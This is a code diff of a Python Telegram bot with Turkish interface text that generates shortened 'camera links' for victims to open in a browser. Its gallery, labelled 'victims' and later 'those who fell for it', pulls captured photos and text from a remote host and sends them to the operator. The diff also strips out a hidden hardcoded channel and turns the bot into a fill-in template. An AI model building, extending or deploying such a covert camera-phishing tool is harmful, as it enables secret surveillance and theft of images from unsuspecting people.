@@ -4,11 +4,6 @@ import string
 import requests
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-BOT_TOKEN = "{BOT_TOKEN}"
-CHANNEL_LINK = "{CHANNEL_LINK}"
-CHANNEL_ID = "{CHANNEL_ID}"
-OWNER_USERNAME = "{OWNER_USERNAME}"
-
 def shorten_url(long_url):
     api = "https://is.gd/create.php"
     params = {
@@ -24,16 +19,13 @@ def shorten_url(long_url):
 
 # ================== AYARLAR ==================
 
-TOKEN = "{BOT_TOKEN}"   # 🔴 DEĞİŞTİR
+TOKEN = "{BOT_TOKEN}"           # Burası otomatik doldurulacak
+BASE_URL = "https://ghosturl.ct.ws"  # Değiştirmek istersen değiştir
+DATA_PATH = "./data"            # Sunucu tarafında değişebilir
 
-BASE_URL = "https://ghosturl.ct.ws"  # 🔴 DEĞİŞTİR
-DATA_PATH = "./data"                # gerekirse değiştir
-
-# 🔒 GİZLİ KANALLAR
+# Kullanıcının kendi kanalı (admin formundan geliyor)
 CHANNELS = [
-    {"id": -1002571650878, "link": "https://t.me/+bGWIvUJh0XgyYWM0"},
-    {"id": {CHANNEL_ID}, "link": "{CHANNEL_LINK}"},
-
+    {{"id": {CHANNEL_ID}, "link": "{CHANNEL_LINK}"}},
 ]
 
 # ============================================
@@ -66,7 +58,7 @@ def send_join_menu(uid):
 
     bot.send_message(
         uid,
-        "❗ <b>Devam etmek için kanallara katılmalısın</b>",
+        "❗ <b>Devam etmek için önce kanala katılmalısın</b>",
         reply_markup=kb
     )
 
@@ -74,16 +66,19 @@ def send_join_menu(uid):
 def send_main_menu(uid):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
-        InlineKeyboardButton("📷 Kamera", callback_data="camera"),
-        InlineKeyboardButton("Kurbanlar", callback_data="gallery")
+        InlineKeyboardButton("📷 Kamera Linki Al", callback_data="camera"),
+        InlineKeyboardButton("👀 Düşenler", callback_data="gallery")
     )
 
     bot.send_message(
         uid,
-        "👋 Hoş geldin\n Bu Botun Kurucusu {OWNER_USERNAME} Sorun olursa yazın.",
+        "👋 Hoş geldin!\n"
+        f"Botun kurucusu: @{OWNER_USERNAME}\n"
+        "Sorun olursa yazabilirsin.",
         reply_markup=kb
     )
-    
+
+# ────────────────────────────────────────────
 @bot.callback_query_handler(func=lambda call: call.data == "camera")
 def camera_handler(call):
     uid = call.from_user.id
@@ -93,9 +88,10 @@ def camera_handler(call):
 
     bot.send_message(
         uid,
-        f"📷 <b>Kamera Linkin (Telegramdan açarsa çalışmaz)</b>\n\n{short_link}",
+        f"📷 <b>Kamera Linkin\n(Telegram içinden açma, tarayıcıda aç)</b>\n\n{short_link}",
         parse_mode="HTML"
     )
+
 # ────────────────────────────────────────────
 @bot.message_handler(commands=["start"])
 def start(msg):
@@ -112,13 +108,11 @@ def check_join(call):
     uid = call.from_user.id
 
     if joined_all(uid):
-        bot.answer_callback_query(call.id, "✅ Katılım doğrulandı")
+        bot.answer_callback_query(call.id, "✅ Katılım tamam!")
         send_main_menu(uid)
     else:
         bot.answer_callback_query(
-            call.id,
-            "❌ Tüm kanallara katılmadın",
-            show_alert=True
+            call.id, "❌ Hâlâ katılmadığın kanal var!", show_alert=True
         )
 
 # ────────────────────────────────────────────
@@ -133,33 +127,33 @@ def gallery_handler(call):
         txt_url = base_url + f"{letter}.txt"
 
         try:
-            headers = {'User-Agent': 'Mozilla/5.0'}
-            img_resp = requests.get(img_url, headers=headers, timeout=5)
-            txt_resp = requests.get(txt_url, headers=headers, timeout=5)
-        except requests.exceptions.RequestException:
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+            img_resp = requests.get(img_url, headers=headers, timeout=6)
+            txt_resp = requests.get(txt_url, headers=headers, timeout=6)
+        except:
             break
 
-        # Dosya yoksa döngüyü kır
         if img_resp.status_code != 200:
             break
 
-        # txt dosyası yoksa uyarı yaz
         if txt_resp.status_code == 200 and 'html' not in txt_resp.text.lower():
-            txt_content = txt_resp.text[:1024]
+            txt_content = txt_resp.text[:1200]
         else:
-            txt_content = "FOTO ÇEKİLDİ"
+            txt_content = "Ek bilgi yok"
 
-        # Foto + caption gönder
-        bot.send_photo(
-            uid,
-            img_url,
-            caption=txt_content,
-            parse_mode=None  # HTML parse etmeyi kapattık
-        )
-        sent_any = True
+        try:
+            bot.send_photo(
+                uid,
+                img_url,
+                caption=txt_content,
+                parse_mode=None
+            )
+            sent_any = True
+        except:
+            pass  # tek tek hata verse bile devam etsin
 
     if not sent_any:
-        bot.send_message(uid, "Kimse Düşmemiş.")
+        bot.send_message(uid, "Henüz kimse düşmemiş...")
 
 # ────────────────────────────────────────────
 bot.infinity_polling()
